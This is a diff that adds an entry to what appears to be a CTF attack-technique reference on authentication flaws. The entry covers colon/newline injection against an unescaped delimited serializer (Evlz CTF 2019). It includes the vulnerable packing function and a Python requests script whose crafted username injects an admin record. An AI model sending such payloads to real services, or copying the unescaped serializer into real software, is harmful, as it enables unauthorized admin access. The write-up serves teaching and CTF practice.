@@ -26,6 +26,7 @@
 - [Subdomain Takeover](#subdomain-takeover)
 - [Apache mod_status Information Disclosure + Session Forging (29c3 CTF 2012)](#apache-mod_status-information-disclosure--session-forging-29c3-ctf-2012)
 - [JA4/JA4H TLS and HTTP Fingerprint Matching (BSidesSF 2026)](#ja4ja4h-tls-and-http-fingerprint-matching-bsidessf-2026)
+- [Colon/Newline Injection in String-Separator Serialization (Evlz CTF 2019)](#colonnewline-injection-in-string-separator-serialization-evlz-ctf-2019)
 
 For JWT/JWE token attacks, see [auth-jwt.md](auth-jwt.md). For OAuth/OIDC, SAML, CI/CD credential theft, and infrastructure auth attacks, see [auth-infra.md](auth-infra.md).
 
@@ -745,5 +746,38 @@ headers = collections.OrderedDict([
 
 **References:** BSidesSF 2026 "cloudpear"
 
+---
+
+### Colon/Newline Injection in String-Separator Serialization (Evlz CTF 2019)
+
+**Pattern:** Registration packs account records as delimited strings without escaping the delimiter. An example `_pack_data()` joins fields with `:` and newline-separates rows:
+```python
+def _pack_data(data_dict):
+    return '{}:{}:{}'.format(
+        data_dict['username'],
+        data_dict['password'],
+        data_dict['admin'],
+    )
+```
+Register with a username that smuggles extra colons plus a newline to inject a complete admin record behind your own:
+```python
+import requests
+data = {
+    'username': 'fearless:12345:true\ntest',
+    'password': 'test',
+}
+r = requests.post('http://target/register', data=data)
+# Stored line becomes:
+#   fearless:12345:true
+#   test:test:False
+# Log in as user "fearless" with password 12345 -> admin=true.
+```
+The first row parses as `username=fearless`, `password=12345`, `admin=true`; the leftover `test:test:False` lands on a second line as a separate (harmless) user.
+
+**Key insight:** Custom string-separator serialization without delimiter escaping allows direct field injection. Whenever a backend builds its own pseudo-CSV/INI format, test every structural byte (`:`, `,`, `|`, `\n`, `\r`, `\t`) inside every user-controlled field — most handwritten serializers skip escaping entirely, letting you append extra fields (admin flags, ACL entries) or entire records.
+
+**References:** Evlz CTF 2019 — WeTheUsers, writeup 13212
+
+---
 
 See [auth-and-access-2.md](auth-and-access-2.md) for additional 2018-era auth attacks (bucket collision, Unicode homograph, SRP zero, ArangoDB MERGE).
